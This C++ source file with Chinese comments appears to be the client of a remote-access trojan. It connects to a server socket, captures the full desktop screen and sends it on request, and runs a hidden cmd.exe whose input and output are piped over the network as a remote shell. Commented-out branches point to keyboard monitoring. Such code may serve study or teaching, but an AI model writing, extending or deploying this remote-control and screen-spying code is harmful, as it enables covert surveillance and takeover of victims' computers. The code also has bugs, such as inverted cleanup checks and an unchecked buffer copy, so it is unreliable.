#include "stdafx.h"
#include "work.h"
extern BOOL iskeyHook;
extern HANDLE myIn;
extern  HANDLE myOut;


//发送头
BOOL sendData(SOCKET s, LPCVOID data, DWORD len) {


	if (s == INVALID_SOCKET)
		return FALSE;
	int countlen = 0;//发送的总长
	while (countlen < len) {
		int n = send(s, ((char*)data) + countlen, len-countlen, 0);//单次发送的长度
		if (n <= 0)
			return FALSE;
		else {
			countlen += n;
		}
	}
	return TRUE;
}


BOOL sendData(SOCKET s, DWORD code, LPCVOID data, DWORD len) {
	PackHeader PH;
	PH.type = code;
	PH.length = len;
	if (s == INVALID_SOCKET || data == NULL || len == 0)
		return FALSE;
	int countlen = 0;//发送的总长
	while (countlen < len) {
		int n = send(s, ((char*)data) + countlen, len - countlen, 0);//单次发送的长度
		if (n <= 0)
			return FALSE;
		else {
			countlen += n;
		}
	}
	return TRUE;
}





BOOL recvData(SOCKET s, LPCVOID data, DWORD len) {

	if (s == INVALID_SOCKET || data == NULL || len == 0)
		return FALSE;

	int countlen = 0;//接受的总长

	while (countlen < len) {
		int n = recv(s, ((char*)data) + countlen, len - countlen, 0);//单次接受的长度
		if (n <= 0)
			return FALSE;
		else {
			countlen += n;
		}
	}
	return TRUE;
}



VOID GetScreen(SOCKET s) {
	HDC deskDC;
	HDC deskcompDC;
	HBITMAP deskcompBitemap;
	//先获取screen的width和height
	int hWidth = GetSystemMetrics(SM_CXSCREEN);
	int hHeight = GetSystemMetrics(SM_CYSCREEN);
	//定义位图大小 宽*高*4
	int size = hWidth * hHeight * 4;
	//定义存放的缓冲区
	char* buf = new char[size+8];
	memcpy(buf, &hWidth, sizeof(hWidth));
	memcpy(buf + sizeof(hWidth), &hHeight, sizeof(hHeight));

	try {
		

		//获取桌面源DC
		 deskDC = GetDC(GetDesktopWindow());
		 if (!deskDC)
			 throw deskDC;
		//创建兼容的内存DC
		 deskcompDC = CreateCompatibleDC(deskDC);
		 if (!deskcompDC)
			 throw deskcompDC;
		//创建兼容位图
		 deskcompBitemap = CreateCompatibleBitmap(deskDC, hWidth, hHeight);
		 if (!deskcompBitemap)
			 throw deskcompBitemap;
		//关联内存DC和位图
		SelectObject(deskcompDC, deskcompBitemap);
		//把源桌面DC拷贝内存DC
		BitBlt(deskcompDC, 0, 0, hWidth, hHeight, deskDC, 0, 0, SRCCOPY);
	
	
		//获取位图数据
		GetBitmapBits(deskcompBitemap, size, buf+8);
	}
	catch (...) {
		if (!deskDC)
			ReleaseDC(GetDesktopWindow(), deskDC);
		if (!deskcompDC)
			DeleteDC(deskcompDC);
		if (!deskcompBitemap)
			DeleteObject(deskcompBitemap);
		return;
	}
	//如果获取成功就会来这里

	//在这里向服务器发送数据
	PackHeader PH;
	PH.type = CTOS_SCREENT;
	PH.length = size + 8;
	sendData(s,&PH, sizeof(PH));//先发送头
	sendData(s, PH.type, buf, PH.length);
	//发送完毕释放DC等数据
	ReleaseDC(GetDesktopWindow(), deskDC);
	DeleteDC(deskcompDC);
	DeleteObject(deskcompBitemap);
	delete[] buf;


}

SOCKET InitSock() {
	WSAData wsaData;
	WSAStartup(0x0202, &wsaData);
	SOCKET Client = socket(AF_INET, SOCK_STREAM, 0);
	if (Client == INVALID_SOCKET)
		return INVALID_SOCKET;

	sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8848);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	int res = connect(Client, (sockaddr*)&addr, sizeof(sockaddr_in));
	if (res == INVALID_SOCKET)
		return INVALID_SOCKET;

	return Client;

}


BOOL InitPipe(HANDLE* myin, HANDLE* myout, DWORD* prcessid ) {
	//创建于cmd通信的管道
	//本程序出口与cmd入口的管道
	HANDLE myOut;
	HANDLE cmdIn;
	//cmd的出口与本程序入口的管道
	HANDLE cmdOut;
	HANDLE myIn;

	SECURITY_ATTRIBUTES sa = {0};
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	//创建本程序出口与cmd入口的管道
	int res = CreatePipe(&cmdIn, &myOut, &sa, 0);
	if (!res)
		return FALSE;

	res = CreatePipe(&myIn, &cmdOut, &sa, 0);
	if (!res)
		return FALSE;

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = cmdIn;
	si.hStdOutput = cmdOut;
	res = CreateProcess(_T("C:\\Windows\\System32\\cmd.exe"),//进程路径
		NULL,//命令行参数
		NULL,//进程继承
		NULL,//线程继承
		TRUE,//是否继承句柄
		CREATE_NO_WINDOW,//创建模式
		NULL,//环境变量
		NULL,//工作路径
		&si,//启动信息
		&pi);//进程信息
	if (!res)
		return FALSE;
	*myin = myIn;
	*myout = myOut;
	*prcessid = pi.dwProcessId;
	
	return TRUE;

}
VOID cmd(HANDLE myIn, HANDLE myOut,SOCKET s,char* lpStr) {
	DWORD Len = strlen(lpStr);
	int i = 0;
	PackHeader PH;
	//PH.type = eCmd;
	char wbuf[256] = {0};
	memcpy(wbuf, lpStr, Len);
	wbuf[Len] = '\n';
	wbuf[Len + 1] = '\0';

	DWORD numofwrite = 0;
	DWORD numofread = 0;

	
	while (1) {
		PH = { 0 };
		char Packbuf[256 + 8] = { 0 };
		char pipebuf[256] = { 0 };
		char rbuf[256] = { 0 };
		DWORD haveByte = 0;
		PeekNamedPipe(myIn, pipebuf, sizeof(pipebuf)-1, &haveByte, NULL, NULL);
		if (!haveByte)
			break;
		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
		PH.length = strlen(rbuf)+1;
		//PH.type = eCmd;
		
		memcpy(Packbuf, &PH, sizeof(PackHeader));
		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
		send(s, Packbuf, sizeof(PH), 0);
		send(s, Packbuf + sizeof(PH), PH.length, 0);
	}

	WriteFile(myOut, wbuf, strlen(wbuf), &numofwrite, NULL);

	while (1) {
		
		PH = { 0 };
		char Packbuf[256 + 8] = { 0 };
		char pipebuf[256] = { 0 };
		char rbuf[256] = { 0 };
		DWORD haveByte = 0;
		if (!i) {
			Sleep(300);
		} else
			Sleep(50);
		PeekNamedPipe(myIn, pipebuf, sizeof(pipebuf)-1, &haveByte, NULL, NULL);
		if (!haveByte)
			break;
		ReadFile(myIn, rbuf, sizeof(rbuf)-1, &numofread, NULL);
	//	PH.type = eCmd;
		PH.length = strlen(rbuf) + 1;
		memcpy(Packbuf, &PH, sizeof(PackHeader));
		memcpy(Packbuf + sizeof(PackHeader), rbuf, PH.length);
		send(s, Packbuf, sizeof(PH), 0);
		send(s, Packbuf + sizeof(PH), PH.length, 0);
	}
	PH.type = -1;
	PH.length = -1;

	send(s, (char*)&PH, sizeof(PH), 0);
}

DWORD _stdcall proceThread(LPVOID p) {
	while (TRUE) {
		SOCKET s = (SOCKET)p;
		char Databuf[256] = { 0 };
		PackHeader PH;
		recvData(s, &PH, sizeof(PackHeader));
		if (PH.length > 0) {
			//说明服务器有数据发过来在这里接受
			//recvData(s, Databuf, PH.length);
		}

		switch (PH.type)
		{
		case STOC_SCREENT:{
							  //获取桌面数据然后在函数里发送给服务器
							  GetScreen(s);

		}break;
		/*case eCmd:{
					  iskeyHook = FALSE;
				   recv(s,(char*) command, sizeof(command)-1, 0);
				  
				   cmd(myIn, myOut, s, command);
		}break;
		case eKeyboard:{//键盘监控程序
						   iskeyHook = TRUE;
		}break;*/
		default:break;

		}
		PH = {0};

	}


}